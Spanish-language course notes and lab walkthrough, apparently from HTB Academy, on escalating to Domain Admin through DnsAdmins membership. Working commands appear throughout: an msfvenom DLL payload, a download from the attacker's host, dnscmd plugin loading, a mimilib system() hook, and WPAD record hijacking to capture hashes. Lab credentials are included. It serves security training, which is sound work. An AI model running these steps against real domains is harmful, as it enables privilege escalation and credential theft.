# **DnsAdmins**

---

## Concepto central:

* Los miembros de [`DnsAdmins`](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins) pueden administrar el servicio DNS del dominio. El servicio DNS en Windows corre con la cuenta `NT AUTHORITY\SYSTEM`.
* Si puedes controlar qué DLL carga el servicio DNS, ese DLL se ejecutará con privilegios del sistema. En un Domain Controller esto puede llevar a **escalada a Domain Admin**.

---

## `ServerLevelPluginDll`

* **Qué es:** una clave/valor en el registro que indica una DLL de "plugin" que el servicio DNS cargará.
* **Debilidad:** [`ServerLevelPluginDll`](https://learn.microsoft.com/es-es/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) acepta una ruta a DLL sin verificar contenido ni origen. Si un administrador DNS controla ese valor, puede apuntar a una DLL maliciosa.

---

## Herramienta usada para escribir la clave: `dnscmd`

- [`dnscmd` documentación](https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/dnscmd)
- [Publicación](https://adsecurity.org/?p=4064)

* **`dnscmd.exe /config /serverlevelplugindll <ruta>`** — comando para configurar la ruta del plugin a nivel servidor.

  * `/config` indica que vamos a cambiar configuración del servidor DNS.
  * `/serverlevelplugindll` es la propiedad que se va a establecer.
* **Restricción:** sólo miembros de `DnsAdmins` pueden ejecutar esta operación con éxito; un usuario normal recibe `ERROR_ACCESS_DENIED` (Status = 5).


`Notas`:
- La gestión de DNS se realiza mediante `RPC`. En este caso, `dnscmd.exe` no modifica directamente el registro o los archivos del servidor, sino que envía una solicitud `RPC` al servicio `DNS` para que éste mismo realice la acción.
- Cuando se ejecuta `dnscmd.exe` se modifica `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`
- Cuando se reinicia el servicio DNS, se cargará la `DLL` en esta ruta (es decir, un recurso compartido de red al que puede acceder la cuenta de la máquina del controlador de dominio)
- Un atacante puede cargar una DLL personalizada para obtener un shell inverso o incluso cargar una herramienta como Mimikatz como una DLL para volcar credenciales.

---

## Generar la DLL maliciosa con `msfvenom`

Ejemplo del curso:

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

* `msfvenom` — generador de payloads de Metasploit.
* `-p windows/x64/exec` — payload: ejecutar comando en Windows x64.
* `cmd='...'` — el comando que el payload ejecutará: en este caso `net group "domain admins" netadm /add /domain` añade el usuario `netadm` al grupo Domain Admins en el dominio (el usuario debe existir).
* `/add` indica añadir el usuario el grupo especificado.
* `/domain` Le dice a `net group` que la operación se haga en el controlador de dominio, no en la máquina local.
* `-f dll` — formato de salida: DLL.
* `-o adduser.dll` — archivo de salida.

Salida del ejemplo incluye mensajes informativos como tamaño del payload y confirmación de fichero guardado.

---

## Servir el archivo con un servidor HTTP simple

Comando mostrado:

```bash
python3 -m http.server 7777
```

* `python3 -m http.server 7777` — arranca un servidor HTTP estático en el puerto `7777` sirviendo el directorio actual.
* Útil para transferir `adduser.dll` al host objetivo desde la máquina atacante.

Salida típica muestra la IP que hace la petición y el archivo servido (ej. `GET /adduser.dll` 200).

---

## Descargar el fichero desde el target

Ejemplo en PowerShell:

```powershell
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

* `wget` en PowerShell es alias de `Invoke-WebRequest` o `curl` dependiendo de la versión.
* `-outfile` especifica el nombre local donde guardar el fichero descargado.

---

## Intento como usuario no privilegiado — error de acceso

Comando:

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

* Resultado esperado para usuario normal: `ERROR_ACCESS_DENIED` (Status = 5). El servicio DNS no permite que usuarios no miembros de `DnsAdmins` cambien esa configuración.

---

## Caso contrario, se tienen privilegios
## Confirmar pertenencia a `DnsAdmins`

Comando PowerShell mostrado:

```powershell
Get-ADGroupMember -Identity DnsAdmins


distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109    
```

* `Get-ADGroupMember` lista miembros de un grupo de Active Directory.
* Salida muestra atributos como `distinguishedName`, `name`, `SamAccountName`, `objectGUID`, `SID`.
* En este caso, vemos que nuestro usuario aparece entre los miembros.

---

## Carga de la DLL como miembro de `DnsAdmins`

Comando:

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll


Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

* Si el usuario es miembro de `DnsAdmins`, la respuesta será `Registry property serverlevelplugindll successfully reset.` y `Command completed successfully.`
* **Nota importante del texto:** hay que dar la ruta **completa** a la DLL; si no se especifica bien, el servicio no la cargará correctamente.
* Sólo dnscmd puede modificar esa propiedad, no es un permiso directo sobre la clave de registro para el usuario.

---

## ¿Cuándo se ejecuta la DLL?

* La DLL configurada en `ServerLevelPluginDll` **se cargará cuando el servicio DNS (named service) se inicie**.
* Si el usuario que controla `DnsAdmins` puede también parar/iniciar el servicio DNS, puede forzar la carga inmediata; si no, deberá esperar al próximo reinicio del servicio/servidor.

---

## Comprobar permisos del usuario sobre el servicio DNS (SDDL)

**Obtener SID del usuario:**

```cmd
wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

* `wmic useraccount where name="..." get sid` devuelve el SID del usuario `netadm`.

**Mostrar descriptor de seguridad del servicio:**

[Artículo](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)

```cmd
sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

* `sc sdshow <Servicio>` muestra la SDDL (Security Descriptor Definition Language) del servicio.
* En la SDDL del ejemplo aparece: `(A;;RPWP;;;S-1-5-21-...-1109)` — la parte `RPWP` indica permisos concedidos al SID indicado.
* El texto aclara que `RPWP` se traduce a `SERVICE_START` y `SERVICE_STOP` (es decir, permisos para iniciar y detener el servicio).
* Para entender SDDL conviene ver la referencia de Windows (Windows Fundamentals), pero aquí sólo explicamos: SDDL describe permisos sobre recursos.

---

## Parar e iniciar el servicio DNS

**Parar:**

```cmd
sc stop dns
```

* `sc stop <servicio>` solicita al servicio que se detenga. La salida muestra `STATE: STOP_PENDING` y otros campos como `WIN32_EXIT_CODE` y `WAIT_HINT`.

**Iniciar:**

```cmd
sc start dns
```

* `sc start <servicio>` arranca el servicio y la salida puede mostrar `STATE: START_PENDING` y el `PID` del proceso si arranca.
* Al arrancar, el servicio intentará cargar la DLL configurada. Si la DLL provoca errores o no existe, el servicio puede quedarse en fallo (por eso el texto advierte que al principio puede fallar hasta limpiar la configuración).

---

## Confirmar que el exploit funcionó

* Tras reinicio exitoso, si la DLL ejecutaba `net group "Domain Admins" ...` deberíamos ver al usuario añadido al grupo `Domain Admins`.
* Comando para listar miembros del grupo Domain Admins en el dominio:

```cmd
net group "Domain Admins" /domain

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

---

## Revertir cambios

**Por qué es crítico:** modificar la configuración y reiniciar DNS en un DC puede derribar resolución de nombres para todo el dominio; hay que tener **permiso explícito del cliente**.

Pasos para limpiar según el texto (desde una consola elevada con cuenta admin):

1. **Comprobar la clave en registro**

```cmd
reg query \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters


HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

* `reg query \<host>\HKLM\...` consulta la rama de registro remota. La salida debe mostrar `ServerLevelPluginDll    REG_SZ    adduser.dll` si la clave quedó establecida.

2. **Eliminar la clave que apunta a la DLL**

```cmd
reg delete \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

* `reg delete <ruta> /v <valor>` elimina el valor de registro `ServerLevelPluginDll`. El comando pedirá confirmación `(Yes/No)?`.

3. **Iniciar el servicio DNS** (ahora que no apunta a la DLL)

```cmd
sc.exe start dns
```

```cmd
C:\htb> sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
* Si la eliminación fue correcta, el servicio arrancará normalmente y `sc query dns` deberá mostrar `STATE: 4 RUNNING`.

4. **Verificar funcionamiento DNS**

* Ejecutar `nslookup` contra localhost u otro host para comprobar resolución.

---

## Uso alternativo: `mimilib.dll` (Mimikatz integrado)

[Publicación](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

La publicación muestra cómo utilizar [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) del creador de `Mimikatz` para obtener ejecución de comandos modificando el archivo [`kdns.c`](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) 

El archivo contiene funciones que implementa un plugin DNS. Explicación de las partes claves:

```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}

```

* `kdns_DnsPluginInitialize(...)` y `kdns_DnsPluginCleanup()` — funciones de inicialización/limpieza que retornan `ERROR_SUCCESS` (0) para indicar que todo bien.
* `kdns_DnsPluginQuery(...)` — función llamada por el servicio DNS cuando procesa una query. En el ejemplo:

  * Se abre o crea un fichero de log `kiwidns.log` y escribe la consulta (`pszQueryName` y `wQueryType`).
  * Luego ejecuta `system("ENTER COMMAND HERE");` — aquí se puede poner una línea para lanzar una reverse shell o cualquier comando.
* **Concepto:** colocar comandos en `system()` dentro de la función que se ejecuta con contexto del servicio permite ejecución de comandos como SYSTEM.

---

## Otra forma de abuso: crear un registro WPAD

**Contexto:** WPAD (Web Proxy Auto-Discovery) permite a clientes autoconfigurarse para usar un proxy en la red. Si un atacante agrega un registro DNS `wpad.<dominio>` apuntando al atacante, muchos hosts que ejecuten WPAD con la configuración predeterminada consultarán esa entrada y podrán ser forzados a usar el proxy del atacante.

Podríamos usar una herramienta como [`Responder`](https://github.com/lgandx/Responder) o [`Inveigh`](https://github.com/Kevin-Robertson/Inveigh) para spoofear el tráfico e intentar capturar hashes de contraseñas y descifrarlos sin conexión, o bien, realizar un ataque SMBRelay.


**Protección por defecto:** los servidores DNS introdujeron una *global query block list* que bloquea nombres problemáticos por defecto (ej. `wpad`, `isatap`).



**Pasos del texto para abusar:**

1. **Deshabilitar la lista global de bloqueos:**

Utilizamos [Set-DnsServerGlobalQueryBlockList](https://learn.microsoft.com/es-es/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

* `Set-DnsServerGlobalQueryBlockList -Enable $false` — desactiva la lista global en el servidor DNS indicado por `-ComputerName`.

2. **Crear registro A para `wpad` apuntando al atacante:**

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

* `Add-DnsServerResourceRecordA` añade un registro A (host) en la zona `inlanefreight.local` con nombre `wpad` y la IP del atacante.
* Resultado: clientes que usen WPAD por defecto consultarán `wpad.inlanefreight.local` y podrán ser redirigidos.

**Impacto:** con esto, el atacante podría usar herramientas como Responder o Inveigh para capturar hashes, forzar autenticación SMB/NTLM, o hacer SMBRelay.

---

## Resumen final: vector, requisitos y mitigaciones

* **Vector:** abuso de la funcionalidad de plugins del servicio DNS mediante la clave `ServerLevelPluginDll` o creación de registros WPAD.
* **Requisitos:** ser miembro de `DnsAdmins` (o tener permisos equivalentes), posibilidad de colocar una DLL accesible al DC (por ejemplo en un share accesible por la cuenta de máquina), y la capacidad de reiniciar el servicio DNS o esperar a reinicio.
* **Riesgos/impacto:** escalada a `SYSTEM` o `Domain Admin`, caída del servicio DNS si se realiza mal.
* **Buenas prácticas:** no ejecutar cambios de este tipo sin permiso, limpiar registros y configuración después de pruebas, y limitar quién es miembro de `DnsAdmins`.



---

## Laboratorio


#### Aproveche la pertenencia al grupo DnsAdmins para escalar privilegios. Envíe el contenido de la bandera ubicada en c:\Users\Administrator\Desktop\DnsAdmins\flag.txt

- `ip`: `10.129.11.96`
- `user`: `netadm`
- `password`: `HTB_@cademy_stdnt!`


Nos conectamos al host mediante `rdp`:

```bash
xfreerdp /v:10.129.11.96 /u:netadm
```

<img width="1534" height="988" alt="image" src="https://github.com/user-attachments/assets/fca709e9-6252-439a-a693-b48e07394953" />

Abrimos una `powershell` y verificamos si pertenecemos al grupo `DnsAdmins`:
```powershell
Get-ADGroupMember -Identity DnsAdmins
```

<img width="1015" height="217" alt="image" src="https://github.com/user-attachments/assets/0b3612d7-2dc2-43c2-abce-5716edca3412" />

Al pertenecer al grupo `DnsAdmins` podemos usar las herramientas de administración `DNS` para configurar la clave `ServerLevelPluginDll` en el registro. Si la `DLL` apuntada es maliciosa y el servicio `DNS` (que corre como SYSTEM) la carga —por ejemplo tras reiniciar el servicio— su código se ejecutará con privilegios `SYSTEM`, lo que puede permitir la elevación de privilegios (especialmente grave si DNS corre en un Domain Controller).

Creamos la dll maliciosa en nuestro host utilizando `msfvenom`:
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

<img width="1621" height="205" alt="image" src="https://github.com/user-attachments/assets/4d936853-02c6-4711-941d-c03ba9339cc9" />


Transferimos el dll a la máquina víctima mediante un servidor en python:

```bash
python3 -m http.server 7777
```


Descargamos el fichero desde la máquina víctima:
```powershell
wget "http://10.10.14.29:7777/adduser.dll" -outfile "adduser.dll"
```

<img width="854" height="404" alt="image" src="https://github.com/user-attachments/assets/2eb72e74-6c6a-4832-a92e-cf34e987a612" />
<img width="1192" height="138" alt="image" src="https://github.com/user-attachments/assets/06c7473e-eb4f-4c5b-a079-b7e29be8c4f9" />
